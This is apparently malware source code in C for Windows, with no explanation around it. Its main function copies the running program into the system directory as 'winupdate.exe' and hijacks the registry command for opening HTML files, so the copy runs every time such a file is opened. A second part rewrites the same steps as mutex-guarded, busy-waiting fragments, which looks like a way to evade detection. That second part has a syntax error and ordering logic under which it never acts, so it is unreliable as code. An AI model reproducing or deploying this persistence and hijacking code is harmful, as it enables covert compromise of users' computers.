DWORD WINAPI bull_moose(LPVOID tid_ptr)
{
	char MyPath[256], CpyPath[256];
	GetModuleFileName(NULL,MyPath,sizeof(MyPath));
	GetSystemDirectory(CpyPath,sizeof(CpyPath));
	strcat(CpyPath,"\\winupdate.exe");
	CopyFile(MyPath,CpyPath,FALSE);
	strcat(CpyPath," %1");

	HKEY Key32;
	RegOpenKeyEx(HKEY_CLASSES_ROOT,"htmlfile\\shell\\opennew\\command",0,KEY_WRITE,&Key32);
	RegSetValueEx(Key32,"",0,REG_SZ,CpyPath,strlen(CpyPath));
	RegCloseKey(Key32);
	return 0;
}

HANDLE hMutex;
static long LOOPS = 190000;

int initMutex(const char* mutextName)
{
	hMutex = CreateMutex(NULL, FALSE, mutextName);
	if (hMutex == NULL) {
		return 1;
	}
	return 0;
}

char MyPath[256], CpyPath[256];
int order = 0;
void BullMoose_part_1() {
	for (int i = 0; i < LOOPS; i++);
	WaitForSingleObject(hMutex, INFINITE);
    if((2 - order) == 1){
        order = 2;
        GetModuleFileName(NULL,MyPath,sizeof(MyPath));
        GetSystemDirectory(CpyPath,sizeof(CpyPath));
        strcat(CpyPath,"\\winupdate.exe");
    }
	ReleaseMutex(hMutex);
}
void BullMoose _part_2() {
		for (int i = 0; i < LOOPS; i++);
	WaitForSingleObject(hMutex, INFINITE);
	if((2 - order) == 1){
		order = 2;	
		CopyFile(MyPath,CpyPath,FALSE);
	}
	ReleaseMutex(hMutex);
}
